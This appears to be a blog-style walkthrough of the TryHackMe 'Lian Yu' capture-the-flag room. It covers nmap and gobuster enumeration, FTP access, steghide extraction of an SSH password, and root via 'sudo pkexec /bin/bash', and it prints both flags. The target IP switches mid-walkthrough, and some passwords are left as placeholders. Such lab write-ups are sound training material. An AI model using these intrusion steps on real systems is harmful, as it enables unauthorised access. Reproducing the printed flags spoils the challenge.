# 🏝️ Lian Yu – TryHackMe Walkthrough

![Banner](https://i.imgur.com/your-banner-image.png)

![Platform](https://img.shields.io/badge/Platform-TryHackMe-red)
![Difficulty](https://img.shields.io/badge/Difficulty-Easy-green)
![Type](https://img.shields.io/badge/Type-CTF-blue)
![Focus](https://img.shields.io/badge/Focus-Enumeration%20%7C%20Steganography%20%7C%20PrivEsc-purple)

---

## 🧠 Overview

Lian Yu is a TryHackMe CTF inspired by *Arrow (Deathstroke / Slade Wilson storyline)*.  
This machine focuses on:
- Enumeration
- Hidden directories
- Steganography
- Credential harvesting
- Privilege escalation

---

# 🔎 STEP 1: Reconnaissance

## 🔍 Nmap Scan

Run a full scan to identify open ports and services.

```bash
nmap -sC -sV -A 10.48.137.137
📌 Results
21/tcp – FTP (vsftpd 3.0.2)
22/tcp – SSH (OpenSSH 6.7p1)
80/tcp – HTTP (Apache – “Purgatory”)
111/tcp – rpcbind

👉 Key takeaway:
We have FTP + Web + SSH, meaning initial foothold likely from FTP or web.

🌐 STEP 2: Web Enumeration
🔧 Gobuster Scan

We scan for hidden directories on the web server.

gobuster dir -u http://10.48.137.137 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
📌 Findings
/island
/server-status (403 Forbidden)

Now we dig deeper into /island.

🌐 STEP 3: Deep Web Enumeration
🔍 Inside /island

We fuzz deeper inside:

/island/2100

We also discover a hidden file:

/green_arrow.ticket

👉 Key takeaway:
The number 2100 becomes important later.

📂 STEP 4: FTP Enumeration
🔐 Login to FTP
ftp 10.48.165.72
Credentials:
Username: vigilante
Password: (provided in challenge / guessed / discovered)
📁 Directory Listing

We find several files:

Leave_me_alone.png
Queen's_Gambit.png
aa.jpg
.other_user (hidden file)
📥 Download Files
mget *

👉 Now we analyze downloaded files locally.

🕵️ STEP 5: Hidden File Analysis
📄 Check Hidden File
cat .other_user
🧠 Result:

We find lore about Slade Wilson (Deathstroke).

👉 This confirms theme + hints at identity-based password clues.

🧩 STEP 6: Steganography Extraction
🖼️ Extract Hidden Data from Image

We check aa.jpg.

steghide --extract -sf aa.jpg
🔐 Passphrase (found via hints)
(empty / guessed / derived from context)
📦 Output
ss.zip
📂 Extract ZIP File
unzip ss.zip
Files extracted:
passwd.txt
shado
🔍 Check Files
cat shado
🧠 Result:
M3tahuman

👉 This is our SSH password clue

🔑 STEP 7: SSH Login
🔐 Connect via SSH
ssh slade@10.48.137.137
Password:
M3tahuman
✅ Success Login Message

We successfully gain access as user slade.

👤 STEP 8: User Flag
📄 Read user flag
cat user.txt
🏁 Result:
THM{P30P7E_K33P_53CRET5__C0MPUT3R5_D0N'T}
⚙️ STEP 9: Privilege Escalation
🔍 Check sudo permissions
sudo -l
Output:
(root) PASSWD: /usr/bin/pkexec

👉 Key insight:
We can run pkexec as root.

💥 Exploit
sudo -u root /usr/bin/pkexec /bin/bash
👑 We are ROOT now
👑 STEP 10: Root Flag
📄 Capture root flag
cat root.txt
🏁 Result:
THM{MY_W0RD_I5_MY_B0ND_IF_I_ACC3PT_YOUR_CONTRACT_THEN_IT_WILL_BE_COMPL3TED_OR_I'LL_BE_D34D}
🧾 SUMMARY
🛠️ Skills Used
Nmap scanning
Gobuster directory brute force
FTP enumeration
Hidden file discovery
Steganography (steghide)
SSH login
Privilege escalation (pkexec abuse)
💬 CONCLUSION

This machine teaches the importance of:

Deep enumeration
Checking hidden files
Analyzing images for hidden data
Privilege escalation awareness

Even simple hints can lead to full system compromise.
